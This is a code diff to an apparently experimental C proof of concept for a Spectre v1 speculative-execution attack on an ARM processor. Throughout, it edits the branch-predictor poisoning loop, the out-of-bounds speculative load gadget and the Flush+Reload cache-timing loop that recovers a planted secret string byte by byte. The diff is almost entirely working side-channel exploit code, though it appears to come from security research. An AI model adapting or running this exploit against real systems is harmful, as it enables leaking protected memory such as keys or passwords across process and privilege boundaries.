@@ -37,12 +37,13 @@
 #define REPEAT_16(x)  x x x x x x x x x x x x x x x
 #define REPEAT_8(x)  x x x x x x x x
 
-static unsigned int size __attribute__((aligned(4096))) = 16;
+static unsigned char *size;
+static unsigned int data __attribute__((aligned(4096))) = 16;
 uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t *reloadbuffer;
 char *secret = "123457812345678";
-static unsigned char data __attribute__((aligned(4096))) = 32;
 static volatile uint8_t pick = 0; 
+uint64_t dummy[100] = {0};
 
 /*
  * Measure the latency: check whether dco kicks in
@@ -80,24 +81,18 @@ static inline __attribute__((always_inline)) void measure_time() {
 
 
 static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
-	//pick = data;
+	size[0] = 16;
+	pick = data;
+	//size = 16;
 	/*
 	 * Spectre v1 runahead
 	 */
-	if (index < size)
+	MOV(15);
+	if (index < size[0] + 16)
 	{	
-		//#ifdef N
-		asm volatile(
-			"mov x10, #10\n\r"
-			".rept 500\n\r"
-			"eor x10, x10, #1\n\r"
-			".endr\n\r"
-			::: "x10"
-		);
-		//#endif
 		pick = reloadbuffer[fake_buffer[index] << 12];
 	}
-//	measure_time();
+	//measure_time();
 }
 
 
@@ -119,21 +114,21 @@ static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *b
 		for (int i = 0; i < 256; i++)
 			cacheflush(&reloadbuffer[i * STRIDE]); 
 
-		train_index = tries % size;
+		train_index = tries % 16;
 		for (int j = 0; j <= 10; j++) {
 
 			/*
 			 *poison branch predictor
 			 */
-			random_int = random(5, 7);
+			random_int = random(5, 9);
 			probe_addr = ((j % random_int) - 1) & 0xFFFFFFFFFFFFFF00; 
 			probe_addr = (probe_addr | (probe_addr >> 8)); 
 			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
-			cacheflush(&size);
-			for(volatile int z = 0; z < 100; z++){}
+//			cacheflush(&size);
+			cacheflush(&data);
+			//for(volatile int z = 0; z < 100; z++){}
 			isb();
-			//cacheflush(&data);
-			//pick = data;
+	//		pick = data;
 			spectre_v1(probe_addr);
 		}
 		
@@ -149,7 +144,7 @@ static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *b
 			pick = reloadbuffer[index * STRIDE];
 			end = get_cycles();
 			isb();
-			if (end - init <= 190 && index != fake_buffer[tries % size])
+			if (end - init <= 190 && index != fake_buffer[tries % 16])
 				results[index]++; 
 		}
 
@@ -169,6 +164,7 @@ static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *b
 
 int main(int argc, const char * * argv) {
 	reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
+	size = (unsigned char *)mmap(0, 10, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
 	size_t offset = (size_t)(secret - (char *)fake_buffer);
 	int secret_len = strlen(secret);
 	uint8_t byte;
